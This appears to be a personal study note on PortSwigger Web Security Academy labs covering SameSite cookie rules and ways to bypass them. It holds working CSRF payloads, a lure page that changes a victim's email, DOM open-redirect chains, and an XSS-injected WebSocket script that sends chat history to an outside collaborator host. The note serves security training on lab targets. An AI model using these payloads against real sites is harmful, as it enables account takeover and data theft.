---
sticker: emoji//2705
---
## What is a ["site" & an "origin"](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions#what-is-a-site-in-the-context-of-samesite-cookies)?
#samesite #origin
**TLDR:** A **site** encompasses **multiple domain names/subdomains**, whereas an **origin** requires the **exact same URL & port**.
- **Site:** `https://`**`XXX`**`.example.gov.au:`**`XXXX`**
- **Origin:** `https://myapp.example.gov.au:8080`
Thus, a "site" (`https://example.com`) can encompass **multiple "origins"** (i.e. different **subdomains/ports** - `https://app.example.com`, `https://example.com:8080`)

So, any vulnerability **enabling arbitrary JavaScript execution** (e.g. cookie stealing) can be abused to **bypass site-based defenses** (e.g. `SameSite` cookies) on **other domains** belonging to the **same site**.
- *If you can control a **site's subdomain**, or the **port** - you can potentially send/exfiltrate data there.*
![](attachments/SameSite%20cookie%20restrictions-2.png)
![](attachments/SameSite%20cookie%20restrictions-3.png)

### Site: 
Consists of:
- **Top-level domain** (`TLD`) - `.com`, `.net`, etc.
	- Includes **two-part TLDs** like `.gov.au`, called extended TLDs, or `eTLD`
- **1 additional level** of the domain name (`TLD+1`) - **`example`**`.com`
- **URL scheme** (`http(s)`)
***All three** must be the same to be same-site.*
  ![](attachments/SameSite%20cookie%20restrictions.png)
### Origin:
![](attachments/SameSite%20cookie%20restrictions-1.png)

## How does #SameSite work?
A setting that enables browsers to **limit which (if any) cross-SITE requests** should **include specific cookies**.
Protects against specific `CSRF` attacks, like:
- Cookie exfiltration
- Cookie inclusion to induce actions on behalf of other users (as typically control a session's authentication)

Example in use: `Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict` --> prevents cookie from being included in **any cross-site requests.** Typically only used for **sensitive/auth-related cookies** (e.g. tracking data is often `SameSite=None`)

### Types of `SameSite` attributes:
#### `SameSite=Strict`: 
Browsers will not send cookie in **ANY cross-site requests**. 
#### `SameSite=Lax` (default on `Chrome`):
Browsers will ONLY send cookies **cross-site** IF:
- Request uses `GET`
- Request **resulted from a user navigation**, e.g. clicking a link.
*Is the default on `CHROME` if no attribute specified!*
#### `SameSite=None; Secure`: (default on `all other browsers`):
- Cookie will be sent in **ALL requests**, regardless of the site that issued it. 
- **Must be accompanied by** `Secure` (only sent via `HTTPS`), otherwise browsers will reject the cookie & won't be set.

---
## Bypassing `SameSite=Lax` restrictions:
#samesite #samesite-lax

### Bypassing `SameSite=Lax` restrictions using GET requests:
Can either be:
- **Issued directly via URL** (i.e. switching a `POST` request to a `GET`):
``` js
<script>
    document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```
- Via **method override** if the website's framework supports it, by **adding the `_method` parameter to the query string**.
  E.g. `GET /my-account/change-email?email=hi%me.net`**`&_method=POST`**` HTTP/1.1`
``` js
<script>
    document.location = "https://vulnerablesite.net/my-account/change-email?email=pwned@me.net&_method=POST";
</script>
```
Can also be done in a form for some frameworks (e.g. `Symfony`, which supports the `_method` parameter in a **`<form>`**)
``` js
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST">
    <input type="hidden" name="_method" value="GET">
    <input type="hidden" name="recipient" value="hacker">
    <input type="hidden" name="amount" value="1000000">
</form>
```

#### [Lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override): SameSite Lax bypass via method override
#samesite-lax
Change email function may be vulnerable to CSRF, as **no `SameSite` attribute set on cookies.** 
Thus, browser will use the default `Lax` restriction level, thus cookie will be sent in **cross-site `GET` requests involving a top-level navigation (e.g. (auto)clicking a link)**.

Try simply converting the `POST` to a `GET` request - `Method Not Allowed`.
![](attachments/SameSite%20cookie%20restrictions-6.png)
**However,** try adding the **expected method as a `URL` parameter** - **is accepted~!** 
![](attachments/SameSite%20cookie%20restrictions-5.png)

Thus, can host a `script` that either **contacts this URL**, or auto-fill a form that requests that URL.
``` js
<script>
    document.location = "https://vulnerablesite.net/my-account/change-email?email=pwned@me.net&_method=POST";
</script>
```

---

### Bypassing `SameSite=Lax` restrictions with newly issued cookies
#samesite-lax
- ***Note:** This does not apply to cookies **explicitly** set with `SameSite=Lax` attribute* 
Whilst cookies with **explicitly-set** `SameSite=Lax` restrictions aren't usually sent in cross-site `POST` requests, when `SameSite=Lax` attribute is **set by Chrome by default** (e.g. on cookies with no attributes set), the browser **doesn't enforce these restrictions for the first 120 seconds on top-level `POST` requests.** This is to avoid breaking SSO mechanisms, but also creates an **120sec window** for cross-site attacks.

Whilst hitting this 120sec window is difficult, if you can **trigger a cookie refresh** (and starting the 120sec window) **via an on-site gadget** that involves a **top-level navigation** (so the cookies associated with their session are included in the request), can potentially perform the attack. *An example would be triggering an OAuth login flow, which might result in a new session each time.*

Can try and **trigger this cookie refresh from a new tab**, so the browser doesn't leave the original page before the final attack can be delivered, and one mechanism for this is a **popup tab.** However, as browsers block these unless triggered by a user interaction, try wrapping any code triggering it in an `onclick()` statement:
```  js
// will open when the user clicks on the page
window.onclick = () => {
    window.open('https://vulnerable-website.com/login/sso');
}
```


#### [Lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh): SameSite Lax bypass via cookie refresh
- When signing in, redirected to oauth login, and log in via social media, and issued a `session` cookie.
- When you re-visit the `/social-login` endpoint, the oauth login flow occurs again **automatically**, and issues a **new** `session` cookie. Can potentially redirect victim to trigger this, refresh their cookie, and steal it via CSRF (as no randomised tokens present on site)
Can see the process below:
- `GET /social-login` with original cookie (yellow) -->
- Redirects to `oauth-callback`, where a **new session cookie** (blue) **is issued using the old one**, and importantly it **doesn't have `SameSite`** set, so defaults to the browser-default `SameSite=Lax` that *has a 120-second window to be exfiltrated.*
![](attachments/SameSite%20cookie%20restrictions-19.png)
Thus, need to get the site to issue a top-level `POST` request within this window to exfiltrate the cookie.

By using a standard CSRF POC for the email change, observe that:
- If you logged in ***MORE*** *than two minutes ago* --> attack fails, as the user is **redirected to login with social media again (and issue new session token)**
   ![](attachments/Pasted%20image%2020260411185427.png)
- If you logged in ***LESS*** *than two minutes ago* --> the **current `session` cookie is still sent** in the top level POST request, and the **email change is successful**. 
  ![](attachments/Pasted%20image%2020260411185529.png)
Thus, need to ensure the user has **only just logged in** and *then* deliver the email change. So, if we include a pop-up that triggers the social-login cookie refresh, and *then* send the POST request changing the email via CSRF, can abuse this 120sec refresh window to compromise the user.

Can do this by delivering the below page to the victim, containing a `<script>` that will:
- Open a pop-up window *upon on the user clicking the page*, which will automatically trigger their `/social-login` and OAuth-issued cookie refresh.
- After waiting for this to finish (around 8sec in script below), the **original exploit page will send the POST request with the NEW refreshed cookies** to change victim's email via `csrf`, with the new session cookie included because this is a **top-level `POST` request sent within 120sec of cookies being set**.

``` js
<html>
  <body>
  <h1> Click the page to get free robux! </h1>
    <form action="https://mylab.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evil&#64;normal&#45;user&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
window.onclick = () => {
    window.open('https://mylab.web-security-academy.net/social-login');
setTimeout(changeEmail, 8000);
}
function changeEmail() {
      document.forms[0].submit();

}
    </script>
  </body>
</html>
```


---

## Bypassing `SameSite=Strict` restrictions:

### Bypassing `SameSite=Strict` using on-site gadgets
#open-redirection #dom #samesite-strict
Can occasionally utilise an on-site **gadget** that **results in a secondary request** within the **same site**. Browsers will treat these as an **ordinary, standalone request** by the site, and thus **include cookies.**
Gadgets can include:
- **Client side redirects**, or [DOM-based redirection](https://portswigger.net/web-security/dom-based/open-redirection) - that dynamically construct the redirection target **using attacker-controllable input**, e.g. `URL` parameters.

#### Lab: `SameSite=Strict` bypass via client-side redirect
Notice that when posting a comment, get auto-redirected to the home page. Potentially a point for a client side redirect.
Notice that the `.js` that performs this shows up in Burp:
![](attachments/SameSite%20cookie%20restrictions-8.png)
Appends the `postId` of the blog post to the URL redirect. Thus, if we try and change `postId` to a site we control, we can maybe get an open redirect.
So, if we visit: `https://0a9900e804e22838802f0d36009d00fc.web-security-academy.net/post/comment/confirmation?postId=HELLO`, we get redirected to the **blog path** + / + **our input**, `HELLO`.
![](attachments/SameSite%20cookie%20restrictions-9.png)
Can try and URL path traverse up to control the full URL, and even to the `my-account` page - allowing you to **perform an `GET` request for an arbitrary endpoint on the target site**, with the cookies attached. 
`https://0a9900e804e22838802f0d36009d00fc.web-security-academy.net/post/comment/confirmation?postId=../../../../my-account`
![](attachments/Pasted%20image%2020260410193853.png)
To **test that `session` cookies are auto-attached** when you browse to this on another website, visit your exploit server hosting the following script that utilises the DOM-based redirect to send to `/my-account` from the comment confirmation post:
``` js
<script>
	document.location = "https://0a9900e804e22838802f0d36009d00fc.web-security-academy.net/post/comment/confirmation?postId=../../../../my-account/";
</script>
```
When visited, if logged in you'll reach your account page - proving the cookies are sent with this second GET request for `/my-account`. 

Observing that we can change our own email by switching the `POST` to a `GET` method, we just need to include these body params as query parameters and amend the script to the below to **perform a `csrf` arbitrary email change via DOM open redirect**:
``` js
// make sure to URL-encode characters like & --> %26 !!
<script>
	document.location = "https://0a9900e804e22838802f0d36009d00fc.web-security-academy.net/post/comment/confirmation?postId=../../../../my-account/change-email?email=evil2%40normal-user.net%26submit=1";
</script>
```
![](attachments/SameSite%20cookie%20restrictions-10.png)

#### [DOM-based open redirects](https://portswigger.net/web-security/dom-based/open-redirection):
#DOM-redirect #dom
When a script writes **attacker-controllable data into a sink (e.g. `exec()`)** that can **trigger cross-domain navigation.**

E.g. this script unsafely passes the URL `hash` to the `exec()` function, allowing an attacker to trigger an **open redirect** by including their **own URL** at the end of the victim site: e.g. `https://vulnsite.com/#attacker-site.com`
``` js
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}
```
Further, this URL could include the `javascript:` pseudo-protocol to **execute arbitrary code** when the URL is **processed in the unsafe sink by the browser**.

[These are some sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities) that can lead to DOM-based open redirects:
``` js
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()
```

##### [Lab](https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection): DOM-based open redirection
#DOM-redirect #dom
When searching for potential URL redirection sinks, here is one place exec() appears:
![](attachments/SameSite%20cookie%20restrictions-7.png)
This searches the URL for any query parameter `url=XXXXX`, and writes that to `returnUrl` and redirects (`location.href`) to that URL. 
E.g., when loading the following URL: `https://0a6400f5042cd0b081ac2ace00dd0083.web-security-academy.net/post?postId=6&url=https://google.com#`, when the `Back to Blog` button is clicked, redirects to google.com. Can change this to whatever malicious site you want.
Thus, on our exploit server need to run a script that auto-clicks this button to redirect to the malicious site.



### Bypassing `SameSite=Strict` via vulnerable sibling domains
#samesite-strict
Because requests can be **same-site** but **cross-origin** (e.g. from `https://dev.myapp.com` --> `https://test.myapp.com`), if you can compromise **one site**, can expose **all domains to cross-site attacks**. Thus could include **any vulnerabilities that enable arbitrary second requests**, e.g.:
- #XSS 
- #DOM-redirect 
- [Cross-site WebSocket hijacking - `CSRF` on WS Handshakes](../WebSockets.md#Cross-site%20WebSocket%20hijacking%20-%20`CSRF`%20on%20WS%20Handshakes)
#### [Lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain): SameSite Strict bypass via sibling domain
#websocket #csrf #websocket-csrf
The app uses a chat app, that is **hosted on a sibling domain**. Thus, can try and perform `CSRF` via a websocket hijack, to exfiltrate the victim's chat history. Can confirm the initial WS upgrade request contains no `csrf` parameter, so may be vulnerable.

To try and find any sibling domains, observe that resources that are loaded have the `Access-Control-Allow-Origin` header, which reveals that the sibling domain `https://cms-0af2005a041367b680574494003d0022.web-security-academy.net` . This has a login form, that reflects the username onto the page. Maybe XSS here!
Username = `<script>alert(document.domain)</script>`:
![](attachments/SameSite%20cookie%20restrictions-12.png)
This also works when switching from `POST` to `GET`, so **can issue XSS on this sibling domain via URL** redirect.
`https://cms-0af2005a041367b680574494003d0022.web-security-academy.net/login?username=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&password=ss`

Now, to hijack the WS handshake and chat history, need a script that opens a websocket and sends the `READY` message, and returns the content to the attacker's server.
``` js
<script>
    var ws = new WebSocket('wss://0af2005a041367b680574494003d0022.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://av9ifww8dkbuycldae3761eovf16p0dp.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```
By injecting this script into the login form vulnerable to XSS, can initiate the WS chat history recollection via a **cross-origin** request to the original blog app, **which is allowed despite `SameSite=Strict`** as the two URLs are **same-site**:
- **Site 1:** `https://XXXXX.web-security-academy.net`
- **Site 2:** `https://cms-XXXXX.web-security-academy.net`

![](attachments/SameSite%20cookie%20restrictions-16.png)

When this URL is visited by the victim (via a `<script>` on exploit server), can see that they are:
- Redirected to the sibling `cms` domain vulnerable to XSS
- The websocket initiation + sending `READY` message script is injected into login form, sent and loaded onto the page (XSS vuln.)
- The contents of the chat history, recalled by the `READY` message, are sent to the attacker's collaborator server:
![](attachments/SameSite%20cookie%20restrictions-18.png)


---

## Resources:
#url-validation-bypass #bypass
- [URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)